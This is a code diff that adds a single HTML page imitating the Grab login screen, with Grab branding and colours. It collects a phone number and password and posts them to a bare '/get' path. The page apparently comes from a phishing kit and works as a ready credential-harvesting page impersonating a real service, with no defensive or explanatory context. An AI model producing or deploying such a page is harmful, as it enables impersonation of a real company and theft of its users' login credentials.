@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Grab</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+        background-color: #00b14f;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 380px;
+        background: #fff;
+        border-radius: 16px;
+        padding: 40px 32px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 20px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 700;
+        color: #1c1c1c;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 2px solid #e0e0e0;
+        border-radius: 12px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+      }
+      .g-input:focus {
+        border-color: #00b14f;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #00b14f;
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #009e45;
+      }
+      .footer {
+        margin-top: 20px;
+        font-size: 13px;
+        color: #666;
+      }
+      .footer a {
+        color: #00b14f;
+        text-decoration: none;
+        font-weight: 600;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 100 30" width="100" height="30">
+        <text x="50%" y="24" text-anchor="middle" font-family="Arial" font-weight="800" font-size="28" fill="#00b14f">Grab</text>
+      </svg>
+      <h1 class="g-h1">Welcome to Grab</h1>
+      <p class="g-h2">Enter your mobile number to get started</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="tel" name="phone" placeholder="+60 12 345 6789" required>
+        <input class="g-input" type="password" name="password" placeholder="Password (optional)">
+        <button type="submit" class="gbtn-primary">Continue</button>
+      </form>
+      <p class="footer">Don't have an account? <a href="#">Sign Up</a></p>
+    </div>
+  </body>
+</html>
